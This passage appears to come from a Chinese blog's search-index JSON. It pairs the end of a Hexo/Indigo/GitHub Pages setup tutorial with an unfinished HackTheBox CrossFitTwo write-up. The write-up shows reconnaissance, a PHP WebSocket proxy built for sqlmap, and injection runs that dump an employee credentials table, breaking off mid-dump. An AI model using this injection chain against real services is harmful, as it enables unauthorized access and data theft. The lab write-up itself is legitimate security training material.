rss\n\n```\nnpm install hexo-generator-feed --save\n```\n\n#### json-content\n\n用于生成静态站点数据，用于站内搜索的数据源\n\n```\nnpm install hexo-generator-json-content --save\n```\n\n#### QRCode\n\n可选，不安装时会请求 jiathis Api 生成二维码\n\n```\nnpm install hexo-helper-qrcode --save\n```\n\n#### 纠错\n\n这个时候直接运行一下\n\n```\nhexo g\nhexo s\n```\n\n![image-20230613132219884](Hexo-GitHub-Indigo主题搭建博客踩坑日记/image-20230613132219884.png)\n\n发现报错了，网页也无法访问\n\n经过大量的踩坑和排查，最后发现是因为默认安装的为 `hexo 5`，而它不再把 `_` 作为全局变量\n\n> https://hexo.io/docs/variables#Global-Variables\n\n这里切换为 `hexo 4` 即可解决这个问题\n\n```\nnpm uninstall hexo --save\nnpm install hexo@^4.0.0 --save\n```\n\n然后再尝试搭建服务器\n\n```\nhexo g\nhexo s\n```\n\n![image-20230613132539430](Hexo-GitHub-Indigo主题搭建博客踩坑日记/image-20230613132539430.png)\n\n成功搭建并访问\n\n### 站点配置\n\n#### 开启标签页\n\n```\nhexo new page tags\n```\n\n修改 `hexo/source/tags/index.md` 的元数据\n\n```\nlayout: tags\ncomments: false\n---\n```\n\n#### 开启分类页\n\n仅 card theme 支持。\n\n```\nhexo new page categories\n```\n\n修改 `hexo/source/categories/index.md` 的元数据\n\n```\nlayout: categories\ncomments: false\n---\n```\n\n#### 基本配置\n\n为了得到更好的使用体验，以下内容请务必填写完整，因为这些内容会在主题中得到展示。[更多](https://hexo.io/zh-cn/docs/configuration.html)\n\n```\ntitle: your title\nsubtitle: your subtitle\ndescription: your description\nkeywords: your keywords\nauthor: your name\nemail: your email\nurl: your site url\n```\n\n#### Feed 配置\n\n参考 [hexo-generator-feed](https://github.com/hexojs/hexo-generator-feed)\n\n```\nfeed:\n  type: atom\n  path: atom.xml\n  limit: 0\n```\n\n#### jsonContent 配置\n\n为了节约资源，可以对 jsonContent 插件生成的数据字段进行配置，减少数据文件大小。参考 [hexo-generator-json-content](https://github.com/alexbruno/hexo-generator-json-content)\n\n```\njsonContent:\n  meta: false\n  pages: false\n  posts:\n    title: true\n    date: true\n    path: true\n    text: true\n    raw: false\n    content: false\n    slug: false\n    updated: false\n    comments: false\n    link: false\n    permalink: false\n    excerpt: false\n    categories: false\n    tags: true\n```\n\n#### 主题配置\n\n编辑主题配置文件，`themes/indigo/_config.yml`。\n\n#### 左侧菜单\n\n默认配置如下\n\n```\nmenu:\n  home:\n    text: 主页\n    url: /\n  archives:\n    url: /archives\n  tags:\n    url: /tags\n  github:\n    url: https://github.com/yscoder\n    target: _blank\n  weibo:\n    url: http://www.weibo.com/ysweb\n    target: _blank\n  link:\n    text: 测试\n    url: /\n```\n\n添加新菜单项时，在 menu 下增加子属性即可。属性说明如下：\n\n```\nmenu:\n link:               # fontawesome图标，省略前缀，本主题前缀为 icon-，必须\n   text: About       # 菜单显示的文字，如果省略即默认与图标一致，首字母会转大写\n   url: /about       # 链接，绝对或相对路径，必须\n   target: _blank    # 是否跳出，省略则在当前页面打开\n```\n\nfontawesome 图标已集成到主题中，你可以到 [这个页面](http://fontawesome.io/icons/) 挑选合适的图标。\n\n#### favicon\n\n站点 logo，显示在浏览器当前标签页左上角。\n\n```\nfavicon: /favicon.ico\n```\n\n#### 头像\n\n位于左侧菜单上方（官方介绍，但我测试后发现无效）\n\n```\navatar: /img/logo.jpg\n```\n\n#### Email\n\n头像下方\n\n```\nemail: LucifielHack@qq.com\n```\n\n#### color\n\n设置 Android L Chrome 浏览器状态栏颜色，不需要可去除此项或设为 `false`。\n\n```\ncolor: '#3F51B5'\n```\n\n#### 页面标题（card theme）\n\n自定义归档、标签、分类页的大标题。\n\n```\ntags_title: Tags\narchives_title: Archives\ncategories_title: Categories\n```\n\n#### 文章摘要\n\n可以在 Markdown 文件中加 `<!--more-->`以分割摘要与文章正文。未设置时，按 `excerpt_length` 设置截取。\n\n```\n# 文章摘要渲染方式: 为 true 时将渲染为 html，否则为文本\nexcerpt_render: false\n# 截断长度\nexcerpt_length: 200\n# 文字正文页链接文字\nexcerpt_link: 阅读全文...\n```\n\n#### mathjax\n\n开启后，使你的站点支持公式渲染，by [mathjax](https://www.mathjax.org/)。 请按需开启，因为此项需要加载额外的 js 文件。\n\n```\nmathjax: false\n```\n\n#### 分享\n\n文章分享开关，by [jiathis-api](http://www.jiathis.com/help/html/share-with-jiathis-api)。\n\n```\nshare: true\n```\n\n#### 文章打赏\n\n默认开启\n\n```\nreward:\n  title: 谢谢大爷~             #显示的文字\n  wechat: /img/wechat.jpg     #微信，关闭设为 false\n  alipay: /img/alipay.jpg     #支付宝，关闭设为 false\n```\n\n此外在 crad theme 中，可以通过在 markdown 头部添加 `reward: false` 来控制某些不想开启打赏的页面。\n\n关闭\n\n```\nreward: false\n```\n\n> 二维码请自行从微信、支付宝中下载。当两个二维码同时存在时，为保持显示效果的一致性，注意截图时的边框留白保持一致。必要时可借助PS等图片处理工具进行图片大小裁剪、压缩等。\n\n#### 站内搜索\n\n是否开启搜索\n\n```\nsearch: true\n```\n\n#### 布局\n\n开启后，文章页在大屏下会隐藏左侧菜单，专注阅读。\n\n```\nhideMenu: true\n```\n\n#### Toc\n\n开启文章内容导航。\n\n```\n#toc: false  #关闭\ntoc:\n  list_number: false  # 决定导航使用的标签， true 为 ol， false 为 ul。\n```\n\n#### copyright（card theme）\n\n文章页版权声明内容，hexo中所有变量及辅助函数等均可调用，具体请查阅 [hexo.io](http://hexo.io/)。\n\n```\ncopyright: 这里写留言或版权声明：<a href=\"<%- url_for(page.path) %>\" target=\"_blank\" rel=\"external\"><%- url %></a>\n```\n\n#### Less\n\n设置 less 编译时的入口文件路径，[hexo-renderer-less](https://github.com/hexojs/hexo-renderer-less)。\n\n```\nless:\n  compress: true    # 是否压缩css\n  paths:\n    - source/css/style.less\n```\n\n#### 评论\n\n集成了 [disqus](https://disqus.com/)、[友言](http://www.uyan.cc/)、[gitment](https://github.com/imsun/gitment) 和 [valine](https://valine.js.org/)，开启其一即可。\n\n#### 数据统计\n\n集成的有谷歌、腾讯、百度和 CNZZ，请填写你的站点标识。\n\n```\ngoogle_analytics: key\ntajs: 站点id\nbaidu_tongji: 站点id\ncnzz: 站点id\n```\n\n#### 谷歌站点验证（card theme）\n\n```\ngoogle_site_verification: false\n```\n\n#### 规范网址（card theme）\n\n让搜索引擎重定向你的不同域名、不同子域、同域不同目录的站点到你期望的路径。[使用规范网址](https://support.google.com/webmasters/answer/139066)\n\n```\ncanonical: http://imys.net\n```\n\n#### 版权起始年份\n\n```\nsince_year: 2006\n```\n\n#### 自定义页面关于\n\n用户页面中作者相关的描述性文字，如不需要设为 false\n\n```\nabout: 用户页面中作者相关的描述性文字，如不需要设为 false\n```\n\n#### CDN\n\n开启后将使用 unpkg cdn 最新的主题样式，如果想让你的自定义样式生效，把此项设为 `false`。\n\n```\ncdn: true\n```\n\n#### lightbox\n\n文章图片灯箱效果。\n\n```\nlightbox: true\n```\n\n#### ICP 备案号\n\n```\nICP_license: 京ICP备1234556号-1\n```\n\n## 使用 Github 搭建博客\n\n### 注册 Github 账号\n\n使用 Github 搭建博客，首先咱们肯定得需要个 Github 账号吧？教人教到底，咱们先去注册个账号\n\n![image-20230613134332793](Hexo-GitHub-Indigo主题搭建博客踩坑日记/image-20230613134332793.png)\n\n点 `Sign up` 注册\n\n![image-20230613134435619](Hexo-GitHub-Indigo主题搭建博客踩坑日记/image-20230613134435619.png)\n\n输入注册的邮箱\n\n![image-20230613134558740](Hexo-GitHub-Indigo主题搭建博客踩坑日记/image-20230613134558740.png)\n\n输入账号密码后注册即可\n\n然后会向邮箱发送一封邮件，里面一个验证码，输入后即可注册\n\n![image-20230613134914883](Hexo-GitHub-Indigo主题搭建博客踩坑日记/image-20230613134914883.png)\n\n注册并登录后看到的应该是这种界面，因为我的账号使用了很久了，所以这里有一些东西，我就打个马赛克了\n\n### 创建个人仓库\n\n![image-20230613135146115](Hexo-GitHub-Indigo主题搭建博客踩坑日记/image-20230613135146115.png)\n\n点击 `New repository` 创建一个新的仓库\n\n![image-20230613135332050](Hexo-GitHub-Indigo主题搭建博客踩坑日记/image-20230613135332050.png)\n\n这里的仓库名是 `xxx.github.io`，其中 xxx 是你的仓库名，比如我的就是 LucifielHack。\n\n必须得按照这个格式设置，否则是无法解析的\n\n![image-20230613135510893](Hexo-GitHub-Indigo主题搭建博客踩坑日记/image-20230613135510893.png)\n\n点击创建后，会进入这个界面，这也是在告诉我们如何设置\n\n### 生成 SSH 添加到 Github\n\n生成 `SSH` 添加到 `Github` ，连接 `Github` 与本地\n\n右键桌面打开 `Git Bash` ，然后输入下面的命令：\n\n```\ngit config --global user.name \"yourname\"\ngit config --global user.email \"youremail\"\n```\n\n注意：第一次使用 `git` 后需要将用户名和邮箱进行初始化\n\n这里的 name 和 email 分别是 Github 的用户名和邮箱，根据自己的注册信息填写就可以了\n\n```\ngit config user.name\ngit config user.email\n```\n\n可以用上面两条命令确认自己是否输入正确\n\n然后创建 `SSH`，一路回车即可\n\n```\nssh-keygen -t rsa -C \"youremail\"\n```\n\n> `ssh`，简单来讲，就是一个秘钥，其中，`id_rsa`是你这台电脑的私人秘钥，不能给别人看的，`id_rsa.pub`是公共秘钥，可以随便给别人看。把这个公钥放在`GitHub`上，这样当你链接`GitHub`自己的账户时，它就会根据公钥匹配你的私钥，当能够相互匹配时，才能够顺利的通过`git`上传你的文件到`GitHub`上。\n\n这个时候它会告诉你已经生成了`.ssh`的文件夹。在你的电脑中找到这个文件夹。或者`git bash`中输入\n\n```bash\ncat ~/.ssh/id_rsa.pub\n```\n\n将 `id_rsa.pub` 的内容复制好\n\n挨个点击 Settings --> Deploy keys --> Add deploy key\n\n![image-20230613140353370](Hexo-GitHub-Indigo主题搭建博客踩坑日记/image-20230613140353370.png)\n\n然后名字随便取一个就行，把 `id_rsa.pub` 的内容粘贴到 Key 中\n\n在 `git bash` 中输入 `ssh -T git@github.com` ，如果出现 `Hi xxx/xxx.github.io! You've successfully authenticated,but Github does not provide shell access.`即为设置成功\n\n### 将 Hexo 部署到 Github\n\n打开博客根目录下的 `_config.yml` 文件\n\n```\n# Deployment\n## Docs: https://hexo.io/docs/one-command-deployment\ndeploy:\n  type: ''\n```\n\n这是最后一部分，102 行的内容，将它修改为\n\n```\n# Deployment\n## Docs: https://hexo.io/docs/one-command-deployment\ndeploy:\n  type: git\n  repository: https://github.com/LucifielHack/LucifielHack.github.io\n  branch: master\n```\n\n其中的 repository 修改为自己的 Github 仓库地址即可\n\n然后需要安装 `deploy-git` 插件，也就是部署到 Github 的命令，这样才可以使用命令行部署到 Github\n\n```\nnpm install hexo-deployer-git --save\n```\n\n然后\n\n```\nhexo clean\nhexo g\nhexo d\n```\n\n即可发布到 Github\n\n然后等待几分钟即可更新成功\n\n接着去 http://yourname.github.io 这个网站即可看到你的博客\n\n### 设置自定义域名\n\n大家如果有自己的域名的话，可以设置用自己的域名来解析\n\n点击 Settings --> Pages --> Custom domain\n\n将 Custom domain 中的地址设置为自己的域名\n\n![image-20230613141725730](Hexo-GitHub-Indigo主题搭建博客踩坑日记/image-20230613141725730.png)\n\n然后去自己的域名商添加一条解析记录\n\n![image-20230613141742481](Hexo-GitHub-Indigo主题搭建博客踩坑日记/image-20230613141742481.png)\n\n然后就可以通过自己的域名访问到 Github 搭建的 Hexo 博客了\n","categories":["学习记录"]},{"title":"MacBook M1 渗透测试环境踩坑日记","url":"/2023/05/20/学习记录/MacBook-M1-渗透测试环境踩坑日记/","categories":["学习记录"]},{"title":"CrossFitTwo - Hackthebox - 还没做完","url":"/2023/05/19/Hackthebox/Insane/Hackthebox-CrossFitTwo未完成/","content":"\n# Hackthebox - CrossFitTwo未完成\n## 靶场信息\n![](Hackthebox-CrossFitTwo未完成/ae31d143-7961-452d-ba03-ad175fc3e335.png)\n\n## 靶场类型\n![](Hackthebox-CrossFitTwo未完成/0abbf8b1-25d8-407e-be87-a3eeb69757c1.png)\n\n## 信息搜集\n首先使用nmap进行信息搜集\n\n```Plain Text\n┌──(root💀root)-[~/Desktop]\n└─# nmap -A -sS -sC -sV -p- 10.10.10.232\nStarting Nmap 7.91 ( https://nmap.org ) at 2021-07-28 20:35 CST\nWARNING: Service 10.10.10.232:80 had already soft-matched http, but now soft-matched rtsp; ignoring second value\nNmap scan report for 10.10.10.232\nHost is up (0.24s latency).\nNot shown: 65532 closed ports\nPORT     STATE SERVICE             VERSION\n22/tcp   open  ssh                 OpenSSH 8.4 (protocol 2.0)\n| ssh-hostkey:\n|   3072 35:0a:81:06:de:be:8c:d8:d7:27:66:db:96:94:fd:52 (RSA)\n|   256 94:60:55:35:9a:1a:a8:45:a1:ae:19:cd:61:05:ec:3f (ECDSA)\n|_  256 a2:c8:6b:6e:11:b6:70:69:db:d2:60:2e:2f:d1:2f:ab (ED25519)\n80/tcp   open  http                (PHP 7.4.12)\n| fingerprint-strings:\n|   GetRequest, HTTPOptions:\n|     HTTP/1.0 200 OK\n|     Connection: close\n|     Connection: close\n|     Content-type: text/html; charset=UTF-8\n|     Date: Wed, 28 Jul 2021 13:03:17 GMT\n|     Server: OpenBSD httpd\n|     X-Powered-By: PHP/7.4.12\n|     <!DOCTYPE html>\n|     <html lang=\"zxx\">\n|     <head>\n|     <meta charset=\"UTF-8\">\n|     <meta name=\"description\" content=\"Yoga StudioCrossFit\">\n|     <meta name=\"keywords\" content=\"Yoga, unica, creative, html\">\n|     <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n|     <meta http-equiv=\"X-UA-Compatible\" content=\"ie=edge\">\n|     <title>CrossFit</title>\n|     <!-- Google Font -->\n|     <link href=\"https://fonts.googleapis.com/css?family=PT+Sans:400,700&display=swap\" rel=\"stylesheet\">\n|     <link href=\"https://fonts.googleapis.com/css?family=Oswald:400,500,600,700&display=swap\" rel=\"stylesheet\">\n|     <!-- Css Styles -->\n|     <link rel=\"stylesheet\" href=\"css/bootstrap.min.css\" type=\"text/css\">\n|_    <link rel=\"styleshe\n|_http-server-header: OpenBSD httpd\n|_http-title: CrossFit\n8953/tcp open  ssl/ub-dns-control?\n| ssl-cert: Subject: commonName=unbound\n| Not valid before: 2021-01-11T07:01:10\n|_Not valid after:  2040-09-28T07:01:10\n1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :\nSF-Port80-TCP:V=7.91%I=7%D=7/28%Time=610152AC%P=x86_64-pc-linux-gnu%r(GetR\nSF:equest,3541,\"HTTP/1\\.0\\x20200\\x20OK\\r\\nConnection:\\x20close\\r\\nConnecti\nSF:on:\\x20close\\r\\nContent-type:\\x20text/html;\\x20charset=UTF-8\\r\\nDate:\\x\nSF:20Wed,\\x2028\\x20Jul\\x202021\\x2013:03:17\\x20GMT\\r\\nServer:\\x20OpenBSD\\x2\nSF:0httpd\\r\\nX-Powered-By:\\x20PHP/7\\.4\\.12\\r\\n\\r\\n<!DOCTYPE\\x20html>\\n<htm\nSF:l\\x20lang=\\\"zxx\\\">\\n\\n<head>\\n\\x20\\x20\\x20\\x20<meta\\x20charset=\\\"UTF-8\\\nSF:\">\\n\\x20\\x20\\x20\\x20<meta\\x20name=\\\"description\\\"\\x20content=\\\"Yoga\\x20\nSF:StudioCrossFit\\\">\\n\\x20\\x20\\x20\\x20<meta\\x20name=\\\"keywords\\\"\\x20conten\nSF:t=\\\"Yoga,\\x20unica,\\x20creative,\\x20html\\\">\\n\\x20\\x20\\x20\\x20<meta\\x20n\nSF:ame=\\\"viewport\\\"\\x20content=\\\"width=device-width,\\x20initial-scale=1\\.0\nSF:\\\">\\n\\x20\\x20\\x20\\x20<meta\\x20http-equiv=\\\"X-UA-Compatible\\\"\\x20content\nSF:=\\\"ie=edge\\\">\\n\\x20\\x20\\x20\\x20<title>CrossFit</title>\\n\\n\\x20\\x20\\x20\\\nSF:x20<!--\\x20Google\\x20Font\\x20-->\\n\\x20\\x20\\x20\\x20<link\\x20href=\\\"https\nSF:://fonts\\.googleapis\\.com/css\\?family=PT\\+Sans:400,700&display=swap\\\"\\x\nSF:20rel=\\\"stylesheet\\\">\\n\\x20\\x20\\x20\\x20<link\\x20href=\\\"https://fonts\\.g\nSF:oogleapis\\.com/css\\?family=Oswald:400,500,600,700&display=swap\\\"\\x20rel\nSF:=\\\"stylesheet\\\">\\n\\n\\x20\\x20\\x20\\x20<!--\\x20Css\\x20Styles\\x20-->\\n\\x20\\\nSF:x20\\x20\\x20<link\\x20rel=\\\"stylesheet\\\"\\x20href=\\\"css/bootstrap\\.min\\.cs\nSF:s\\\"\\x20type=\\\"text/css\\\">\\n\\x20\\x20\\x20\\x20<link\\x20rel=\\\"styleshe\")%r(\nSF:HTTPOptions,1AFC,\"HTTP/1\\.0\\x20200\\x20OK\\r\\nConnection:\\x20close\\r\\nCon\nSF:nection:\\x20close\\r\\nContent-type:\\x20text/html;\\x20charset=UTF-8\\r\\nDa\nSF:te:\\x20Wed,\\x2028\\x20Jul\\x202021\\x2013:03:17\\x20GMT\\r\\nServer:\\x20OpenB\nSF:SD\\x20httpd\\r\\nX-Powered-By:\\x20PHP/7\\.4\\.12\\r\\n\\r\\n<!DOCTYPE\\x20html>\\\nSF:n<html\\x20lang=\\\"zxx\\\">\\n\\n<head>\\n\\x20\\x20\\x20\\x20<meta\\x20charset=\\\"U\nSF:TF-8\\\">\\n\\x20\\x20\\x20\\x20<meta\\x20name=\\\"description\\\"\\x20content=\\\"Yog\nSF:a\\x20StudioCrossFit\\\">\\n\\x20\\x20\\x20\\x20<meta\\x20name=\\\"keywords\\\"\\x20c\nSF:ontent=\\\"Yoga,\\x20unica,\\x20creative,\\x20html\\\">\\n\\x20\\x20\\x20\\x20<meta\nSF:\\x20name=\\\"viewport\\\"\\x20content=\\\"width=device-width,\\x20initial-scale\nSF:=1\\.0\\\">\\n\\x20\\x20\\x20\\x20<meta\\x20http-equiv=\\\"X-UA-Compatible\\\"\\x20co\nSF:ntent=\\\"ie=edge\\\">\\n\\x20\\x20\\x20\\x20<title>CrossFit</title>\\n\\n\\x20\\x20\nSF:\\x20\\x20<!--\\x20Google\\x20Font\\x20-->\\n\\x20\\x20\\x20\\x20<link\\x20href=\\\"\nSF:https://fonts\\.googleapis\\.com/css\\?family=PT\\+Sans:400,700&display=swa\nSF:p\\\"\\x20rel=\\\"stylesheet\\\">\\n\\x20\\x20\\x20\\x20<link\\x20href=\\\"https://fon\nSF:ts\\.googleapis\\.com/css\\?family=Oswald:400,500,600,700&display=swap\\\"\\x\nSF:20rel=\\\"stylesheet\\\">\\n\\n\\x20\\x20\\x20\\x20<!--\\x20Css\\x20Styles\\x20-->\\n\nSF:\\x20\\x20\\x20\\x20<link\\x20rel=\\\"stylesheet\\\"\\x20href=\\\"css/bootstrap\\.mi\nSF:n\\.css\\\"\\x20type=\\\"text/css\\\">\\n\\x20\\x20\\x20\\x20<link\\x20rel=\\\"styleshe\nSF:\");\nNo exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).\nTCP/IP fingerprint:\nOS:SCAN(V=7.91%E=4%D=7/28%OT=22%CT=1%CU=43404%PV=Y%DS=2%DC=T%G=Y%TM=610152E\nOS:6%P=x86_64-pc-linux-gnu)SEQ(SP=103%GCD=1%ISR=10B%TI=RD%CI=RI%II=RI%TS=22\nOS:)OPS(O1=M54DNNSNW6NNT11%O2=M54DNNSNW6NNT11%O3=M54DNW6NNT11%O4=M54DNNSNW6\nOS:NNT11%O5=M54DNNSNW6NNT11%O6=M54DNNSNNT11)WIN(W1=4000%W2=4000%W3=4000%W4=\nOS:4000%W5=4000%W6=4000)ECN(R=Y%DF=Y%T=40%W=4000%O=M54DNNSNW6%CC=N%Q=)T1(R=\nOS:Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A\nOS:%A=S%F=AR%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=\nOS:Y%DF=Y%T=40%W=0%S=A%A=S%F=AR%O=%RD=0%Q=)T7(R=N)U1(R=Y%DF=N%T=FF%IPL=38%U\nOS:N=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=S%T=FF%CD=S)\n\nNetwork Distance: 2 hops\n\nTRACEROUTE (using port 3306/tcp)\nHOP RTT       ADDRESS\n1   237.08 ms 10.10.14.1\n2   237.15 ms 10.10.10.232\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 989.11 seconds\n```\n从上面的扫描结果咱们可以得到的线索有 - 本台靶机开启了`22`，`80`，`8953`端口 - 80端口为http服务 - 8953为ssl服务\n\n咱们先进80端口看看\n\n![](Hackthebox-CrossFitTwo未完成/38710e9f-4fce-4d05-a7b5-d03d4d3d6b36.png)\n\n咱们先进行目录路径fuzz吧\n\n```Plain Text\n┌──(root💀root)-[~/Desktop]\n└─# gobuster dir -u http://10.10.10.232 -w /usr/share/seclists/Discovery/Web-Content/common.txt -x php,html,txt -b 403,404\n===============================================================\nGobuster v3.1.0\nby OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)\n===============================================================\n[+] Url:                     http://10.10.10.232\n[+] Method:                  GET\n[+] Threads:                 10\n[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/common.txt\n[+] Negative Status codes:   403,404\n[+] User Agent:              gobuster/3.1.0\n[+] Extensions:              php,html,txt\n[+] Timeout:                 10s\n===============================================================\n2021/07/28 21:27:27 Starting gobuster in directory enumeration mode\n===============================================================\n/about-us.php         (Status: 200) [Size: 15733]\n/blog.php             (Status: 200) [Size: 15369]\n/classes.php          (Status: 200) [Size: 25946]\n/contact.php          (Status: 200) [Size: 8007]\n/css                  (Status: 301) [Size: 510] [--> http://10.10.10.232/css/]\n/elements.php         (Status: 200) [Size: 19654]\n/fonts                (Status: 301) [Size: 510] [--> http://10.10.10.232/fonts/]\n/images               (Status: 301) [Size: 510] [--> http://10.10.10.232/images/]\n/img                  (Status: 301) [Size: 510] [--> http://10.10.10.232/img/]\n/index.php            (Status: 200) [Size: 19041]\n/index.php            (Status: 200) [Size: 19041]\n/js                   (Status: 301) [Size: 510] [--> http://10.10.10.232/js/]\n/main.html            (Status: 200) [Size: 931]\n/readme.txt           (Status: 200) [Size: 410]\n/vendor               (Status: 301) [Size: 510] [--> http://10.10.10.232/vendor/]\n\n===============================================================\n2021/07/28 21:38:26 Finished\n===============================================================\n```\n扫描的同时，在80端口手动收集了一下信息。点击`MEMBER AREA`会跳转到一个域名`employees.crossfit.htb`，但咱们本地没有添加解析，所以我们给它添加上\n\n```Plain Text\necho 10.10.10.232 crossfit.htb employees.crossfit.htb >> /etc/hosts\n```\n然后就可以访问这个域名了\n\n![](Hackthebox-CrossFitTwo未完成/4ef554b5-95f2-4d81-bf0d-7f66c6b1e84c.png)\n\n访问后发现是一个登录页面，手动测试了几个弱口令没有成功，咱们依然挂上目录fuzz然后去进行其他的搜集\n\n```Plain Text\n┌──(root💀root)-[~/Desktop]\n└─# gobuster dir -u http://employees.crossfit.htb/ -w /usr/share/seclists/Discovery/Web-Content/common.txt -x php,html,txt -t 100 -b 403,404\n===============================================================\nGobuster v3.1.0\nby OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)\n===============================================================\n[+] Url:                     http://employees.crossfit.htb/\n[+] Method:                  GET\n[+] Threads:                 100\n[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/common.txt\n[+] Negative Status codes:   403,404\n[+] User Agent:              gobuster/3.1.0\n[+] Extensions:              php,html,txt\n[+] Timeout:                 10s\n===============================================================\n2021/07/28 21:03:34 Starting gobuster in directory enumeration mode\n===============================================================\n/css                  (Status: 301) [Size: 510] [--> http://employees.crossfit.htb/css/]\n/index.php            (Status: 200) [Size: 4412]\n/index.php            (Status: 200) [Size: 4412]\n/js                   (Status: 301) [Size: 510] [--> http://employees.crossfit.htb/js/]\n/vendor               (Status: 301) [Size: 510] [--> http://employees.crossfit.htb/vendor/]\n\n===============================================================\n2021/07/28 21:04:42 Finished\n===============================================================\n```\n![](Hackthebox-CrossFitTwo未完成/0e5006fc-7981-4ce8-b73f-49b707e55f77.png)\n\n查看主页的流量，还可以看到一个域名\n\n```Plain Text\ngym.crossfit.htb\n```\n的\n\n```Plain Text\nwebsocket\n```\n，咱们也加入到hosts里\n\n```Plain Text\necho 10.10.10.232 gym.crossfit.htb >> /etc/hosts\n```\n该条信息所在的js文件\n\n```Plain Text\nhttp://10.10.10.232/js/ws.min.js\n\nfunction updateScroll() {\n  var e = document.getElementById('chats');\n  e.scrollTop = e.scrollHeight\n}\nvar token,\nws = new WebSocket('ws://gym.crossfit.htb/ws/'),\npingTimeout = setTimeout(() =>{\n  ws.close(),\n  $('.chat-main').remove()\n}, 31000);\nfunction check_availability(e) {\n  var s = new Object;\n  s.message = 'available',\n  s.params = String(e),\n  s.token = token,\n  ws.send(JSON.stringify(s))\n}\n$('.chat-content').slideUp(),\n$('.hide-chat-box').click(function () {\n  $('.chat-content').slideUp()\n}),\n$('.show-chat-box').click(function () {\n  $('.chat-content').slideDown(),\n  updateScroll()\n}),\n$('.close-chat-box').click(function () {\n  $('.chat-main').remove()\n}),\nws.onopen = function () {\n},\nws.onmessage = function (e) {\n  'ping' === e.data ? (ws.send('pong'), clearTimeout(pingTimeout)) : (response = JSON.parse(e.data), answer = response.message, answer.startsWith('Hello!') && $('#ws').show(), token = response.token, $('#chat-messages').append('<li class=\"receive-msg float-left mb-2\"><div class=\"receive-msg-desc float-left ml-2\"><p class=\"msg_display bg-white m-0 pt-1 pb-1 pl-2 pr-2 rounded\">' + answer + '</p></div></li>'), updateScroll())\n},\n$('#sendmsg').on('keypress', function (e) {\n  if (13 === e.which) {\n    $(this).attr('disabled', 'disabled');\n    var s = $('#sendmsg').val();\n    if ('' !== s) {\n      $('#chat-messages').append('<li class=\"send-msg float-right mb-2\"><p class=\"msg_display pt-1 pb-1 pl-2 pr-2 m-0 rounded\">' + s + '</p></li>');\n      var t = new Object;\n      t.message = s,\n      t.token = token,\n      ws.send(JSON.stringify(t)),\n      $('#sendmsg').val(''),\n      $(this).removeAttr('disabled'),\n      updateScroll()\n    }\n  }\n});\n```\n![](Hackthebox-CrossFitTwo未完成/d4078ca0-debc-4573-b9b8-7b555cd29d5e.png)\n\n添加后再访问主页，会发现右下角多了一个聊天窗，大约30s后会消失\n\n## 漏洞利用\n测试一下Websockets\n\n```Plain Text\npython3 -m websockets ws://gym.crossfit.htb/ws/\n\n{\"status\":\"200\",\"message\":\"Hello! This is Arnold, your assistant. Type 'help' to see available commands.\",\"token\":\"c7be5b4a23c5c16da958ff6ff7bd2a9ba12870159010824f6018199ece5fd8eb\"}\n```\n我们会发现，每次请求的tokne值都不一样\n\n我们自己写一个websocket-client > 参考连接 https://amphp.org/websocket-client/\n\n```Plain Text\nwebsocket-client.php\n\n<?php\n\nrequire 'vendor/autoload.php';\n\nuse Amp\\Websocket\\Client;\n\nAmp\\Loop::run(function () {\n    $connection = yield Client\\connect('ws://gym.crossfit.htb/ws/');\n    $message = yield $connection->receive();\n    $payload = yield $message->buffer();\n    $token   = json_decode($payload, true)[\"token\"];\n    $check   = json_encode(array('message' => 'available', 'params' => $_GET['id'], 'token' => $token));\n    yield $connection->send($check);\n    $message = yield $connection->receive();\n    $payload = yield $message->buffer();\n    header(\"Content-Type: application/json\");\n    printf($payload);\n\n    $connection->close();\n});\n```\n```Plain Text\ncomposer require amphp/websocket-client\n\nphp -S 0.0.0.0:1234\n```\n开启以后，使用curl获取一下我们的websocket-client.php文件的内容看看\n\n```Plain Text\ncurl http://127.0.0.1:1234/websocket-client.php\n\n┌──(root💀root)-[~/Desktop]\n└─# curl http://127.0.0.1:1234/websocket-client.php\n{\"status\":\"200\",\"message\":\"I'm sorry, this membership plan is currently unavailable.\",\"token\":\"69fc8199b15d3b5b2cbdc79c85d1173d9907a85d0f711348c4bd0273338a3e92\",\"debug\":\"[id: null]\"}\n```\n提示`id:null`，那咱们就给它加一个`id`参数\n\n```Plain Text\ncurl http://127.0.0.1:1234/websocket-client.php?id=1\n\n┌──(root💀root)-[~/Desktop]\n└─# curl http://127.0.0.1:1234/websocket-client.php?id=1\n{\"status\":\"200\",\"message\":\"Good news! This membership plan is available.\",\"token\":\"21968a22a2766f17daf66508929fcb0a0cd333bef79064b0cd90b10c165e096d\",\"debug\":\"[id: 1, name: 1-month]\"}\n```\nOK，这次有参数了，那看到这里大家能想到什么呢？反正我想到了注入，说干就干\n\n```Plain Text\nsqlmap -u http://127.0.0.1:1234/websocket-client.php?id=1 --batch --dbs\n\n[14:38:53] [INFO] fetching database names\navailable databases [1]:\n[*] information_schema\n```\nOK，确定是可以注入的了，咱们一步步注入下去\n\n```Plain Text\nsqlmap -u http://127.0.0.1:1234/websocket-client.php?id=1 --batch --technique=B --threads=10 --dbs\n\navailable databases [3]:\n[*] crossfit\n[*] employees\n[*] information_schema\n```\n```Plain Text\nsqlmap -u http://127.0.0.1:1234/websocket-client.php?id=1 --batch --technique=B --threads=10 -D employees --tables\n\nDatabase: employees\n[2 tables]\n+----------------+\n| employees      |\n| password_reset |\n+----------------+\n```\n```Plain Text\nsqlmap -u http://127.0.0.1:1234/websocket-client.php?id=1 --batch --technique=B --threads=10 -D employees -T employees --dump\n\nDatabase: employees\nTable: employees\n[4 entries]\n+----+-----------------------------+------------------------------------------------------------------+---------------+\n| id | email                       | password                                                         | username      |\n+----+-----------------------------+------------------------------------------------------------------+---------------+\n| 1  | 